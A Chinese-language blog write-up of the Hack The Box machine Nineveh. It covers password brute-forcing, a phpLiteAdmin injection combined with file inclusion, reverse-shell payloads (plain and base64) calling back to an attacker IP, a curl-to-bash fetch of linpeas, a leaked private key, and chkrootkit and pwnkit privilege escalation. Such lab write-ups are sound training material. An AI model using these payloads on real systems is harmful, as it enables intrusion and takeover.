      <title>Linux-8-Nineveh</title>
      <link href="/2023/10/18/Linux-8-Nineveh/"/>
      <url>/2023/10/18/Linux-8-Nineveh/</url>
      
        <content type="html"><![CDATA[<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sS -T4 -Pn -v 10.10.10.43</span><br></pre></td></tr></table></figure><p>扫描结果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT    STATE SERVICE</span><br><span class="line">80/tcp  open  http</span><br><span class="line">443/tcp open  https</span><br></pre></td></tr></table></figure><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 10.10.10.43 --max-rate 100</span><br></pre></td></tr></table></figure><p>扫描结果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[07:29:31] 200 -  178B  - /index.html</span><br><span class="line">[07:29:34] 200 -   83KB - /info.php</span><br></pre></td></tr></table></figure><p>再使用<code>gobuster</code>枚举</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u 10.10.10.43 -w /mnt/c/Users/chihf/Desktop/SRC/Tools/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt</span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/department           (Status: 301) [Size: 315] [--&gt; http://10.10.10.43/department/]</span><br></pre></td></tr></table></figure><p>访问<code>/department</code>是一个登录页面，抓包，使用<code>burp</code>爆破，用户名<code>admin</code>密码是<code>1q2w3e4r5t</code></p><p>对于<code>443</code>端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u https://10.10.10.43 --max-rate 100</span><br></pre></td></tr></table></figure><p>扫描结果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[07:28:54] 200 -   11KB - /db/</span><br><span class="line">[07:28:54] 200 -   11KB - /db/index.php</span><br><span class="line">[07:29:15] 200 -   49B  - /index.html</span><br></pre></td></tr></table></figure><p>访问<code>https://10.10.10.43/db</code>可以看到有一个登录页面<br>抓包，使用<code>burp</code>爆破，密码是<code>password123</code></p><ul><li>这里使用<code>burp</code>自带的字典没法爆破成功</li><li>使用<code>SecLists\Passwords\2020-200_most_used_passwords.txt</code>可以爆破成功<br>登录成功</li></ul><h2 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h2><p>在<code>https</code>页面访问，我们看到了<code>phpLiteAdmin v1.9</code>界面，搜索此版本，存在远程代码执行漏洞，该漏洞利用原理大概如下：</p><ul><li>We create a db named “hack.php”</li><li>Now create a new table in this database and insert a text field with the default value:<code>&lt;?php phpinfo()?&gt;</code></li><li>Now we run hack.php<br>根据提示在当前已有的<code>test</code>数据库中创建<code>test</code>数据表，并将<code>&lt;?php phpinfo()?&gt;</code>插入数据表中（注意类型是<code>text</code>），并将数据库名更改为<code>/var/www/html/test</code>，却发现如下报错<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**Warning**: copy(/var/www/html/test): failed to open stream: Permission denied in **/var/www/ssl/db/index.php** on line **1259**</span><br></pre></td></tr></table></figure>没有在此目录下创建的权限</li></ul><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>在<code>http</code>页面下访问，注意到<code>topbar</code>中的<code>notes</code>路径很奇怪</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt</span><br></pre></td></tr></table></figure><p>怀疑存在文件包含，尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.43/department/manage.php?notes=../files/ninevehNotes.txt</span><br></pre></td></tr></table></figure><p>回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**Warning**:  include(../files/ninevehNotes.txt): failed to open stream: No such file or directory in **/var/www/html/department/manage.php** on line **31**</span><br></pre></td></tr></table></figure><p>给出完整路径，再次尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.43/department/manage.php?notes=/var/www/html/department/files/ninevehNotes.txt</span><br></pre></td></tr></table></figure><p>回显正常，尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.43/department/manage.php?notes=../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>回显</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">No Note is selected.</span><br></pre></td></tr></table></figure><p>猜测必须包含<code>ninevehNotes</code>才能正常显示</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>将以上两个问题结合分析，我们在<code>https</code>页面下创建名为<code>ninevehNotes</code>的数据库，在<code>http</code>页面下访问<br><code>https</code>页面<br>在已有的数据库下，新建<code>test</code>数据表，并添加<code>&lt;?php phpinfo()?&gt;</code>字段，并更改数据库名称为<code>/var/tmp/ninevehNotes1</code><br><code>http</code>页面<br>访问<code>http://10.10.10.43/department/manage.php?notes=/var/tmp/ninevehNotes1</code>，观察确实显示<code>phpinfo</code>页面<br>思路可行，我们将<code>php</code>代码更改为反弹<code>shell</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php shell_exec(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.47/20000 0&gt;&amp;1&#x27;&quot;)?&gt;</span><br></pre></td></tr></table></figure><p>因为我们在<code>sql</code>中进行这些操作，而单引号，双引号的存在可能会导致结果的错误，因此我们将内容进行<code>base64</code>加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -n &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.24/10000 0&gt;&amp;1&#x27;&quot;|base64</span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yNC8xMDAwMCAwPiYxJw==</span><br></pre></td></tr></table></figure><p>在本地尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yNC8xMDAwMCAwPiYxJw==|base64 -d|bash</span><br></pre></td></tr></table></figure><p>本地监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -nvlp 10000</span><br></pre></td></tr></table></figure><p>连接成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(vwv㉿vwv)-[/mnt/…/chihf/Desktop/HTB/Nineveh]</span><br><span class="line">└─$ sudo nc -nvlp 10000</span><br><span class="line">listening on [any] 10000 ...</span><br><span class="line">connect to [192.168.84.217] from (UNKNOWN) [192.168.80.1] 50217</span><br><span class="line">┌──(vwv㉿vwv)-[/mnt/c/users/chihf/Desktop/src/tools]</span><br></pre></td></tr></table></figure><p>构造远端<code>phpshell</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php shell_exec(&quot;echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yNC8xMDAwMCAwPiYxJw==|base64 -d|bash&quot;)?&gt;</span><br></pre></td></tr></table></figure><p>成功获取<code>shell</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(vwv㉿vwv)-[/mnt/…/chihf/Desktop/HTB/Nineveh]</span><br><span class="line">└─$ sudo nc -nvlp 10000</span><br><span class="line">listening on [any] 10000 ...</span><br><span class="line">connect to [192.168.84.217] from (UNKNOWN) [192.168.80.1] 50714</span><br><span class="line">bash: cannot set terminal process group (1389): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">www-data@nineveh:/var/www/html/department$</span><br></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>先使用<code>linpeas</code>查看可能的提权信息<br>本端开启服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 10001</span><br></pre></td></tr></table></figure><p>远端获取<code>linpeas</code>并且进行提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 10.10.16.24:10001/linpeas.sh | bash</span><br></pre></td></tr></table></figure><ul><li>可能存在<code>ssh</code>公钥<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">╔══════════╣ Analyzing SSH Files (limit 70)</span><br><span class="line"></span><br><span class="line">-rw------- 1 amrois amrois 400 Jul  2  2017 /home/amrois/.ssh/authorized_keys</span><br></pre></td></tr></table></figure></li><li>这个图片可能存在<code>ssh</code>私钥<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">══╣ Possible private SSH keys were found!</span><br><span class="line">/var/www/ssl/secure_notes/nineveh.png</span><br></pre></td></tr></table></figure></li><li>存在<code>knockd</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╔══════════╣ Analyzing Knockd Files (limit 70)</span><br><span class="line">-rwxr-xr-x 1 root root 1572 Mar 25  2009 /etc/init.d/knockd</span><br></pre></td></tr></table></figure></li><li>有可能通过<code>knockd</code>开启22端口<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">╔══════════╣ Active Ports</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports</span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -</span><br></pre></td></tr></table></figure>几个有趣的点</li><li><code>knockd</code> 一个控制防火墙策略的程序，按照一定的顺序执行某几个端口的时候会执行一定的操作<ul><li>在<code>active port</code>我们发现开放了80，22，443端口</li><li>本题中可能通过<code>knockd</code>开启22端口</li></ul></li><li><code>amrois</code>用户可以通过<code>ssh</code>登录<br>先查看<code>/etc/init.d/knockd</code>文件<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">DAEMON=/usr/sbin/knockd</span><br><span class="line">NAME=knockd</span><br><span class="line">PIDFILE=/var/run/$NAME.pid</span><br><span class="line">DEFAULTS_FILE=/etc/default/knockd</span><br><span class="line">DESC=&quot;Port-knock daemon&quot;</span><br><span class="line">OPTIONS=&quot; -d&quot;</span><br></pre></td></tr></table></figure>查看<code>/etc/default/knockd</code>文件<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># PLEASE EDIT /etc/knockd.conf BEFORE ENABLING</span><br><span class="line">START_KNOCKD=1</span><br></pre></td></tr></table></figure>查看<code>/etc/knockd.conf</code>文件<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">KNOCKD_OPTS=&quot;-i ens160&quot;</span><br><span class="line">www-data@nineveh:/tmp$ cat /etc/knockd.conf</span><br><span class="line">cat /etc/knockd.conf</span><br><span class="line">[options]</span><br><span class="line"> logfile = /var/log/knockd.log</span><br><span class="line"> interface = ens160</span><br><span class="line"></span><br><span class="line">[openSSH]</span><br><span class="line"> sequence = 571, 290, 911</span><br><span class="line"> seq_timeout = 5</span><br><span class="line"> start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT</span><br><span class="line"> tcpflags = syn</span><br><span class="line"></span><br><span class="line">[closeSSH]</span><br><span class="line"> sequence = 911,290,571</span><br><span class="line"> seq_timeout = 5</span><br><span class="line"> start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT</span><br><span class="line"> tcpflags = syn</span><br></pre></td></tr></table></figure>从文件可知我们在5秒内依次<code>nc</code>以下端口：571 299 911即可开放22端口<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 10.10.10.43 571</span><br><span class="line">nc -nv 10.10.10.43 290</span><br><span class="line">nc -nv 10.10.10.43 911</span><br><span class="line">nc -nv 10.10.10.43 22</span><br></pre></td></tr></table></figure>其中私钥可以从<code>/var/www/ssl/secure_notes/nineveh.png</code>中获得<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings /var/www/ssl/secure_notes/nineveh.png</span><br></pre></td></tr></table></figure>构造<code>id_rsa</code>文件<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim id_rsa</span><br><span class="line">chmod +600 id_rsa</span><br><span class="line">ssh amrois@10.10.10.43 -i id_rsa</span><br></pre></td></tr></table></figure><code>id_rsa</code>文件内容如下<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI</span><br><span class="line">H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU</span><br><span class="line">PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5</span><br><span class="line">FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI</span><br><span class="line">3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT</span><br><span class="line">X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn</span><br><span class="line">KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk</span><br><span class="line">FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z</span><br><span class="line">GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR</span><br><span class="line">JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo</span><br><span class="line">9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu</span><br><span class="line">Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb</span><br><span class="line">ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl</span><br><span class="line">1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b</span><br><span class="line">vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx</span><br><span class="line">DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89</span><br><span class="line">P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC</span><br><span class="line">fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i</span><br><span class="line">tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC</span><br><span class="line">iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1</span><br><span class="line">MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh</span><br><span class="line">PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse</span><br><span class="line">i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc</span><br><span class="line">il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7</span><br><span class="line">fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>解法二：不适用<code>knockd</code><br>22端口虽然没有对外开放，但是我们可以通过在内部进行<code>ssh</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@nineveh:/tmp# ssh amrois@10.10.10.43 -i id_rsa</span><br><span class="line">ssh amrois@10.10.10.43 -i id_rsa</span><br><span class="line">Pseudo-terminal will not be allocated because stdin is not a terminal.</span><br><span class="line">Host key verification failed.</span><br></pre></td></tr></table></figure></li></ul><p>使用<code>pspy</code>观察进程及定时任务<br>本端开启服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 10001</span><br></pre></td></tr></table></figure><p>远端获取<code>pspy64</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget 10.10.16.24:10001/pspy64</span><br><span class="line">chmod +x pspy64</span><br><span class="line">./pspy64</span><br></pre></td></tr></table></figure><p> <code>chkrootkit</code>是一个<code>linux</code>下的安全检查工具，检查是否有无<code>hook</code>或权限被修改，该工具存在本地提权漏洞</p><ul><li>Put an executable file named ‘update’ with non-root owner in &#x2F;tmp (not mounted noexec, obviously)</li><li>Run chkrootkit (as uid 0)<br>因此我们在本地构建<code>update</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.16.24/10001 0&gt;&amp;1</span><br></pre></td></tr></table></figure>本端开启服务器<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 10000</span><br></pre></td></tr></table></figure>远端获取<code>pspy64</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget 10.10.16.24:10001/update</span><br><span class="line">chmod +x update</span><br></pre></td></tr></table></figure>此时已经获取<code>root</code>权限<br>解法二：使用<code>pwnkit</code><br>在<code>linpeas</code>中指出也可以使用<code>pwnkit</code>进行提权<br>因此<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget 10.10.16.24:10002/pwnkit</span><br><span class="line">chmod +x pwnkit</span><br><span class="line">./pwnkit</span><br></pre></td></tr></table></figure>也可以提权</li></ul>]]></content>
      
      
      
